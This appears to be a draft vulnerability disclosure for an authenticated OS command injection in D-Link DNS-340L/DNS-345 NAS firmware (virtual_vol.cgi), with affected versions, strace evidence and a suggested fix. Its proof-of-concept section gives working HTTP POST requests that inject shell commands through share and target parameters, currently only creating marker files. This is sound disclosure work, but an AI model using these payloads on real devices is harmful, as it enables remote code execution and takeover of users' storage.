# Vulnerability Submission: D-Link DNS-340L / DNS-345 virtual_vol.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-001 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-340L ShareCenter; DNS-345 ShareCenter |
| Confirmed Firmware Versions | DNS-340L REVA 1.01B04; DNS-345 REVA 1.03B06, 1.04.B02, 1.05b04 HOTFIX |
| Confirmed Firmware Images | dlink-DNS__DNS-340L_REVA_FIRMWARE_1.01B04.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.03B06.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.04.B02.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.05b04_HOTFIX.ZIP |
| Affected Binary | cgi/disk_mgr/virtual_vol.cgi |
| Web Endpoint | /cgi-bin/virtual_vol.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-340L 1.01B04: a6af595140cc2b987935b448dbc80bae16a385db; DNS-345 1.03B06/1.04.B02/1.05b04 HOTFIX: e363537367bc606fa6a460bbc17e7fcefca3af10 |

## Description

The `virtual_vol.cgi` CGI handler builds shell command strings with HTTP POST parameters and executes them through `system()`. The affected Virtual Volume commands include share-name checking, target creation, target deletion, target connection, and target formatting. Parameters such as `f_sharename`, `f_target`, and `f_name` are inserted directly into `vvctl` command lines without shell metacharacter neutralization.

The vulnerable command templates observed at runtime include:

```text
vvctl --check_share_name -s <f_sharename> -o /var/www/xml/vv_search.xml > /dev/null
vvctl --add -n <f_target> -l <f_lun> -i <f_ip> -p <f_port> -s <f_name> -c <f_auth> > /dev/null
vvctl --del -n <f_target> > /dev/null
vvctl --connect -n <f_target> > /dev/null &
vvctl --format -n <f_target> -l <f_lun> > /dev/null &
```

Because these commands are executed by `/bin/sh -c`, an authenticated web attacker can inject shell metacharacters and execute arbitrary commands as the CGI process user on the NAS.

## Impact

Successful exploitation allows arbitrary command execution on the NAS appliance. This can modify files, add persistence, access stored data, pivot into the internal network, or disrupt storage services. The Virtual Volume page is part of the authenticated management interface, so this draft scores the issue as authenticated remote code execution.

DNS-340L REVA 1.04b01, 1.05b05, 1.06b02, 1.07B02, PATCH 1.05.B04, PATCH 1.07B01, and 1.08B01 were tested as negative controls. Those builds invoke `vvctl` through an argv-style `safe_system` / `execvp` path and did not produce shell execution or command markers with the same payloads, so they are not included as confirmed affected in this draft.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/virtual_vol.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_VirtalVol_ShareName_Exist&f_sharename=firmrecshare;touch /tmp/DLINK_CMD_001_share_name.hit;#
```

```http
POST /cgi-bin/virtual_vol.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_VirtalVol_Create&f_ip=127.0.0.1&f_port=3260&f_target=iqn.2026-05.firmrec:disk&f_auth=0&f_user=firmrec&f_pwd=abcdefghijkl&f_lun=0&f_name=firmrecshare;touch /tmp/DLINK_CMD_001_create_name.hit;#
```

```http
POST /cgi-bin/virtual_vol.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_VirtalVol_Target_Del&f_target=iqn.2026-05.firmrec:disk;touch /tmp/DLINK_CMD_001_delete_target.hit;#&f_lun=0
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_dns340l_virtual_vol_20260526.py`
- `inout/reports/0day_verification_20260526/dns340l_101b04_virtual_vol_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/dns340l_101b04_virtual_vol_verdict_20260526.md`
- `inout/reports/0day_verification_20260526/dns345_103b06_virtual_vol_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/dns345_103b06_virtual_vol_verdict_20260526.md`
- `inout/reports/0day_verification_20260526/dns345_104b02_virtual_vol_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/dns345_104b02_virtual_vol_verdict_20260526.md`
- `inout/reports/0day_verification_20260526/dns345_105b04_hotfix_virtual_vol_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/dns345_105b04_hotfix_virtual_vol_verdict_20260526.md`
- `inout/reports/0day_verification_20260526/dns340l_108b01_virtual_vol_runtime_20260526.json` negative-control evidence
- `inout/reports/0day_verification_20260526/dns340l_virtual_vol_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/public_duplicate_refresh_20260526_1044.json`
- `inout/reports/0day_verification_20260526/public_duplicate_refresh_20260526_1200.json`
- `inout/reports/0day_verification_20260526/public_duplicate_refresh_20260526_1200.md`

Runtime marker results:

| Test | Controlled marker | Shell/vvctl trace |
|------|-------------------|-------------------|
| `share_name_f_sharename_touch` | Yes | Yes |
| `create_target_touch` | Yes | Yes |
| `create_name_touch` | Yes | Yes |
| `delete_target_touch` | Yes | Yes |
| `connect_target_touch` | Yes | Yes |
| `format_target_touch` | Yes | Yes |

Representative qemu strace evidence:

DNS-340L 1.01B04:

```text
execve("/bin/sh",{"sh","-c","vvctl --check_share_name -s firmrecshare;touch /tmp/FIRMREC_DNS340L_VIRTUAL_VOL_20260526_share_name.hit;# -o /var/www/xml/vv_search.xml > /dev/null",NULL})
```

```text
execve("/bin/sh",{"sh","-c","vvctl --add -n iqn.2026-05.firmrec:disk -l 0 -i 127.0.0.1 -p 3260 -s firmrecshare;touch /tmp/FIRMREC_DNS340L_VIRTUAL_VOL_20260526_create_name.hit;# -c 0 > /dev/null",NULL})
```

```text
execve("/bin/sh",{"sh","-c","vvctl --del -n iqn.2026-05.firmrec:disk;touch /tmp/FIRMREC_DNS340L_VIRTUAL_VOL_20260526_delete_target.hit;# > /dev/null",NULL})
```

DNS-345 1.04.B02:

```text
execve("/bin/sh",{"sh","-c","vvctl --check_share_name -s firmrecshare;touch /tmp/FIRMREC_DNS345_104B02_VIRTUAL_VOL_20260526_share_name.hit;# -o /var/www/xml/vv_search.xml > /dev/null",NULL})
```

```text
execve("/bin/sh",{"sh","-c","vvctl --add -n iqn.2026-05.firmrec:disk -l 0 -i 127.0.0.1 -p 3260 -s firmrecshare;touch /tmp/FIRMREC_DNS345_104B02_VIRTUAL_VOL_20260526_create_name.hit;# -c 0 > /dev/null",NULL})
```

## Public Duplicate Check

Public-record checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link DNS-340L/DNS-345 `virtual_vol.cgi`, `cgi_VirtalVol_*`, or `vvctl --check_share_name`.

NVD API checks:

| Query | Result |
|-------|--------|
| `virtual_vol.cgi` | 0 CVE records |
| `cgi_VirtalVol` | 0 CVE records |
| `cgi_VirtalVol_ShareName_Exist` | 0 CVE records |
| `vvctl check_share_name D-Link` | 0 CVE records |
| `DNS-340L virtual_vol.cgi` | 0 CVE records |
| `DNS-345 virtual_vol.cgi` | 0 CVE records |

Search queries also checked included:

```text
"virtual_vol.cgi" "D-Link" vulnerability
"cgi_VirtalVol" D-Link
"cgi_VirtalVol_ShareName_Exist"
"vvctl --check_share_name"
"DNS-340L" "virtual_vol.cgi"
"DNS-345" "virtual_vol.cgi" vulnerability
site:nvd.nist.gov/vuln/detail "virtual_vol.cgi"
site:exploit-db.com "virtual_vol.cgi" "D-Link"
site:packetstormsecurity.com "virtual_vol.cgi" "D-Link"
site:seclists.org "virtual_vol.cgi" "D-Link"
```

Public search did surface Western Digital My Cloud `vvctl` / virtual-volume share-name checking references, but those are not direct duplicates because they involve a different vendor/product and a different endpoint rather than D-Link DNS-340L/DNS-345 `virtual_vol.cgi`.

Refresh note: follow-up public duplicate refreshes at 2026-05-26T10:44:03Z and 2026-05-26T11:59:23Z still did not find a direct `virtual_vol.cgi` duplicate. The 11:59 refresh returned 0 NVD records for the exact queries `virtual_vol.cgi`, `cgi_VirtalVol`, `cgi_VirtalVol_ShareName_Exist`, `vvctl check_share_name D-Link`, `DNS-340L virtual_vol.cgi`, and `DNS-345 virtual_vol.cgi`. Broader DNS-340L/DNS-345 command-injection queries do return same-family CVE/advisory material for other endpoints such as `nas_sharing.cgi`, `account_mgr.cgi`, `s3.cgi`, `system_mgr.cgi`, and `network_mgr.cgi`; those are related prior art, not direct duplicates of the verified `cgi_VirtalVol_*` / `vvctl` command templates.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus focused runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored DNS-340L rootfs under qemu-arm-static with command markers |

## Suggested Fix

1. Replace `system()` with `execve()` or equivalent APIs that pass arguments without invoking a shell.
2. Validate `f_sharename`, `f_target`, `f_name`, `f_ip`, `f_port`, `f_user`, and `f_pwd` using strict allowlists.
3. Reject shell metacharacters and unexpected whitespace in all command parameters.
4. Enforce authentication and authorization checks before Virtual Volume management actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
